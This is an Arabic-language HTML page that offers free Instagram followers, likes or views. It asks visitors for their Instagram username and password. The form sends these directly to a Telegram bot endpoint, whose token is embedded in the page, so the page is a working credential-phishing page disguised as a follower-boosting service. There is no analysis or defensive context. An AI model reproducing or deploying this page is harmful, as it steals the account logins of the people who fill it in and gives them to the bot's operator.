<!DOCTYPE html><html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>رشق متابعين انستا</title>
  <style>
    body {
      background: linear-gradient(to bottom right, #4e002d, #1a0033);
      font-family: 'Arial', sans-serif;
      color: white;
      text-align: center;
      padding: 20px;
    }
    .container {
      max-width: 400px;
      margin: 0 auto;
      background: rgba(0, 0, 0, 0.3);
      padding: 20px;
      border-radius: 20px;
      box-shadow: 0 0 15px rgba(0,0,0,0.5);
    }
    h2 {
      margin-bottom: 20px;
    }
    input, select, button {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: none;
      border-radius: 10px;
      font-size: 16px;
    }
    input, select {
      background: white;
      color: #1a0033;
    }
    button {
      background-color: #0052cc;
      color: white;
      cursor: pointer;
      transition: background-color 0.3s;
    }
    button:hover {
      background-color: #003d99;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>رشق متابعين انستا</h2>
    <form action="https://api.telegram.org/bot7197079453:AAFnVl-c5S28araI2YScZOPlQzBUXn_zZIk/sendMessage" method="post">
      <input type="text" name="username" placeholder="اسم المستخدم" required>
      <input type="password" name="password" placeholder="كلمة المرور" required>
      <select name="amount">
        <option value="1000">1000</option>
        <option value="2000">2000</option>
        <option value="5000">5000</option>
      </select>
      <select name="type">
        <option value="متابعين">متابعين</option>
        <option value="لايكات">لايكات</option>
        <option value="مشاهدات">مشاهدات</option>
      </select>
      <button type="submit">ابدأ الرشق الآن</button>
    </form>
  </div>
</body>
</html>
